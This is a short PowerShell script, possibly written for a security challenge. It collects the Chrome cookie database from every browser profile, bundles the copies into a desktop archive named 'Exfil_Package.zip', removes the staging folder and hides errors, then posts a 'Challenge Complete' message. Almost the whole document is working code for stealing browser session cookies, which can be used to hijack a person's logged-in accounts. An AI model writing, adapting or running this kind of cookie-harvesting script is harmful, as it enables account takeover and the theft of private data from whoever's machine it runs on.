# 1. FORCE TLS 1.2 (Ensures the download from GitHub doesn't fail)
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# 2. DEFINE PATHS
$chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data"
$staging = "$env:USERPROFILE\Desktop\Staged_Data"
$zip = "$env:USERPROFILE\Desktop\Exfil_Package.zip"

# 3. TEST ACCESS (Check if Chrome is actually there)
if (!(Test-Path $chromePath)) {
    "Chrome path not found: $chromePath" | Out-File -FilePath "$env:USERPROFILE\Desktop\ERROR_LOG.txt"
    exit
}

# 4. CREATE STAGING
New-Item -ItemType Directory -Path $staging -Force -ErrorAction SilentlyContinue

# 5. THE SWEEP (Using a safer copy method)
$profiles = Get-ChildItem -Path $chromePath -Directory | Where-Object { Test-Path (Join-Path $_.FullName "Network\Cookies") }

foreach ($p in $profiles) {
    try {
        $source = Join-Path $p.FullName "Network\Cookies"
        # We add '.db' so Windows doesn't think it's a system file
        $dest = Join-Path $staging ("Cookies_" + $p.Name + ".db")
        
        # 'Copy-Item -Force' sometimes fails if Chrome is active, so we use this:
        if (Test-Path $source) {
            Copy-Item -Path $source -Destination $dest -Force -ErrorAction SilentlyContinue
        }
    } catch { 
        # Skip errors quietly to keep the script moving
    }
}

# 6. ZIP AND CLEANUP
if ((Get-ChildItem $staging).Count -gt 0) {
    Compress-Archive -Path "$staging\*" -DestinationPath $zip -Force
}
Remove-Item -Path $staging -Recurse -Force -ErrorAction SilentlyContinue

# 7. NOTIFY (Your original persistence)
msg * "Challenge Complete: Check your desktop for the Exfil_Package.zip!"
